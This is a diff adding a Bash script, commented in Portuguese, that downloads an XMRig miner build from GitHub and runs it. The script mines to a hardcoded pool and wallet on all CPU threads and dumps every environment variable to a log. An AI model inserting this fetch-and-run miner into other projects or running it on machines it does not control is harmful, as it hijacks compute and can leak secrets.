@@ -1,0 +1,259 @@
+#!/bin/bash
+
+# ============================================================================
+# CONFIGURAÇÃO DE LOGS
+# ============================================================================
+
+MOEDA1_LOGFILE="/var/log/SRBMOEDA1.log"
+MOEDA2_LOGFILE="/var/log/SRBMOEDA2.log"
+ENV_LOGFILE="/var/log/start-env.log"
+ERROR_LOGFILE="/var/log/error.log"
+
+# Criar arquivos de log
+for logfile in "$MOEDA1_LOGFILE" "$MOEDA2_LOGFILE" "$ENV_LOGFILE" "$ERROR_LOGFILE"; do
+    touch "$logfile"
+    chmod 644 "$logfile"
+done
+
+env >> "$ENV_LOGFILE"
+
+# ============================================================================
+# CONFIGURAÇÃO DO XMRIG (RX/0)
+# ============================================================================
+
+XMRIG_DIR="/opt/xmrig"
+XMRIG_VERSION="6.0.24-virel"  # Versão estável mais recente
+XMRIG_TGZ="xmrig-vrl-linux-static-x64.tar.xz"
+XMRIG_URL="https://github.com/rplant8/xmrig-vrl/releases/download/${XMRIG_VERSION}/${XMRIG_TGZ}"
+
+
+
+
+XMRIG_TGZ_PATH="$XMRIG_DIR/$XMRIG_TGZ"
+XMRIG_PATH="$XMRIG_DIR/xmrig-vrl"
+
+# Criar diretório
+mkdir -p "$XMRIG_DIR"
+
+# VERIFICAR SE JÁ EXISTE UMA VERSÃO INSTALADA
+if [ -f "$XMRIG_PATH" ] && [ -x "$XMRIG_PATH" ]; then
+    echo "$(date): XMRig já instalado: $XMRIG_PATH" >> "$ENV_LOGFILE"
+    CURRENT_VERSION=$("$XMRIG_PATH" --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' || echo "desconhecida")
+    echo "$(date): Versão atual: $CURRENT_VERSION" >> "$ENV_LOGFILE"
+    
+    # Se for a mesma versão, usar a existente
+    if [ "$CURRENT_VERSION" = "$XMRIG_VERSION" ]; then
+        echo "$(date): Usando versão existente (${XMRIG_VERSION})" >> "$ENV_LOGFILE"
+    else
+        echo "$(date): Versão diferente. Baixando nova versão..." >> "$ENV_LOGFILE"
+        # Remover versão anterior
+        rm -rf "$XMRIG_DIR"/*
+    fi
+else
+    echo "$(date): XMRig não encontrado. Baixando nova versão..." >> "$ENV_LOGFILE"
+fi
+
+# BAIXAR NOVA VERSÃO SE NECESSÁRIO
+if [ ! -f "$XMRIG_PATH" ] || [ ! -x "$XMRIG_PATH" ]; then
+    echo "$(date): Baixando XMRig v${XMRIG_VERSION}..." >> "$ENV_LOGFILE"
+    
+    # Remover arquivos antigos
+    rm -f "$XMRIG_TGZ_PATH"
+    
+    if wget -O "$XMRIG_TGZ_PATH" "$XMRIG_URL" 2>> "$ERROR_LOGFILE"; then
+        echo "$(date): Download concluído com sucesso" >> "$ENV_LOGFILE"
+    else
+        echo "$(date): ERRO: Falha no download do XMRig" >> "$ERROR_LOGFILE"
+        exit 1
+    fi
+
+    # EXTRAIR NOVA VERSÃO
+    echo "$(date): Extraindo XMRig..." >> "$ENV_LOGFILE"
+    if tar -xzf "$XMRIG_TGZ_PATH" -C "$XMRIG_DIR" --strip-components=1 2>> "$ERROR_LOGFILE"; then
+        echo "$(date): Extração concluída com sucesso" >> "$ENV_LOGFILE"
+        
+        # Encontrar o binário extraído
+        if [ -f "$XMRIG_PATH" ]; then
+            chmod +x "$XMRIG_PATH"
+            echo "$(date): Binário encontrado e permissões configuradas: $XMRIG_PATH" >> "$ENV_LOGFILE"
+        else
+            # Tentar encontrar o binário com nome diferente
+            BINARY=$(find "$XMRIG_DIR" -name "xmrig" -type f -executable | head -1)
+            if [ -n "$BINARY" ]; then
+                XMRIG_PATH="$BINARY"
+                echo "$(date): Binário encontrado: $XMRIG_PATH" >> "$ENV_LOGFILE"
+            else
+                echo "$(date): ERRO: Não foi possível encontrar o binário do XMRig" >> "$ERROR_LOGFILE"
+                exit 1
+            fi
+        fi
+        
+        # Limpar arquivo tar após extração
+        rm -f "$XMRIG_TGZ_PATH"
+        echo "$(date): Arquivo tar removido" >> "$ENV_LOGFILE"
+        
+        # Verificar versão instalada
+        INSTALLED_VERSION=$("$XMRIG_PATH" --version 2>/dev/null | head -1 || echo "Versão desconhecida")
+        echo "$(date): XMRig instalado: $INSTALLED_VERSION" >> "$ENV_LOGFILE"
+    else
+        echo "$(date): ERRO: Falha na extração do XMRig" >> "$ERROR_LOGFILE"
+        exit 1
+    fi
+fi
+
+# ============================================================================
+# CONFIGURAÇÃO DA MINERAÇÃO
+# ============================================================================
+
+TOTAL_THREADS=$(nproc)
+THREADS1=$((TOTAL_THREADS / 2))
+THREADS2=$((TOTAL_THREADS - THREADS1))
+
+# Configuração da moeda 1 (SCASH - RX/0)
+MOEDA1_POOL="us.0xpool.io:3333"
+MOEDA1_WALLET="0xe51e5d5282386bde64269892256df1af948cdf9b"
+MOEDA1_ALGO="rx/0"
+XMRIG_CONFIG="/opt/xmrig/config.json"
+
+# ============================================================================
+# GERAR CONFIGURAÇÃO DO XMRIG
+# ============================================================================
+
+echo "$(date): Gerando configuração do XMRig..." >> "$ENV_LOGFILE"
+
+cat > "$XMRIG_CONFIG" <<EOL
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": false,
+    "colors": true,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "max-threads-hint": 100,
+        "asm": true,
+        "argon2-impl": null,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "adl": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "donate-level": 1,
+    "donate-over-proxy": 1,
+    "log-file": "$MOEDA1_LOGFILE",
+    "pools": [
+        {
+            "algo": "$MOEDA1_ALGO",
+            "coin": null,
+            "url": "$MOEDA1_POOL",
+            "user": "$MOEDA1_WALLET",
+            "pass": "x",
+            "rig-id": "$(hostname)",
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
+    "retries": 5,
+    "retry-pause": 5,
+    "syslog": false,
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
+EOL
+
+chmod 644 "$XMRIG_CONFIG"
+echo "$(date): Configuração gerada: $XMRIG_CONFIG" >> "$ENV_LOGFILE"
+
+# ============================================================================
+# INICIAR MINERAÇÃO
+# ============================================================================
+
+echo "$(date): Iniciando mineração..." >> "$MOEDA1_LOGFILE"
+
+# Verificar se o binário existe e é executável
+if [ ! -f "$XMRIG_PATH" ] || [ ! -x "$XMRIG_PATH" ]; then
+    echo "$(date): ERRO: Binário do XMRig não encontrado ou não executável: $XMRIG_PATH" >> "$ERROR_LOGFILE"
+    exit 1
+fi
+
+echo "$(date): Executando: $XMRIG_PATH" >> "$ENV_LOGFILE"
+
+# Iniciar XMRig
+"$XMRIG_PATH" \
+    --config="$XMRIG_CONFIG" \
+    >> "$MOEDA1_LOGFILE" \
+    2>> "$ERROR_LOGFILE" &
+
+PID1=$!
+
+echo "$(date): XMRig iniciado. PID=$PID1" >> "$ENV_LOGFILE"
+echo "$(date): Pool: $MOEDA1_POOL" >> "$ENV_LOGFILE"
+echo "$(date): Algoritmo: $MOEDA1_ALGO" >> "$ENV_LOGFILE"
+echo "$(date): Threads: $TOTAL_THREADS" >> "$ENV_LOGFILE"
+
+# Manter o script rodando
+wait $PID1
+
+echo "$(date): XMRig finalizou." >> "$ENV_LOGFILE"
